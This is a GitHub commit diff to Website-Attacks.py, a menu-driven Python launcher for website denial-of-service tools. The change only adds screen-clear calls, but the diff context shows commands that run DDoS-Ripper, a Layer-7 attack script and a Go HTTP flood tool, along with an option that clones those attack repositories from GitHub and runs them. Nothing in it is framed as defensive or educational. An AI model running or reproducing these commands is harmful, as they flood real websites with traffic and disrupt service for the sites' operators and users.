46d6050612e8676fcdc4a84d9e874e7889a33a60
Rebrithed-Reaperr <85047722+Rebrithed-Reaperr@users.noreply.github.com>
2021-06-09 23:41:55 -0500

    Update Website-Attacks.py

--- Website-Attacks.py
+++ Website-Attacks.py
@@ -13,15 +13,19 @@ print
 cyber = raw_input(" Website-Attacks ==>> ")
 
 if cyber == '01' or cyber == '1':
+	os.system(' clear ')
 	os.system(' cd DDoS-Ripper && python3 DRipper.py ')
 	
 elif cyber == '02' or cyber == '2':
+	os.system(' clear ')
 	os.system(' cd Layer-7-Attack && python2 l7a.py ')
 	
 elif cyber == '03' or cyber == '3':
+	os.system(' clear ')
 	os.system(' cd golang-httpflood && go build httpflood.go && ./httpflood <url> <threads> <get/post> <seconds> <header.txt/nil> ')
 
 elif cyber == '04' or cyber == '4':
+	os.system(' clear ')
 	os.system(' git clone https://github.com/palahsu/DDoS-Ripper && git clone https://github.com/MusH4ck007/Layer-7-Attack && git clone https://github.com/Leeon123/golang-httpflood && python2 Website-Attacks.py ')
 
 elif cyber == '00' or cyber == '0':
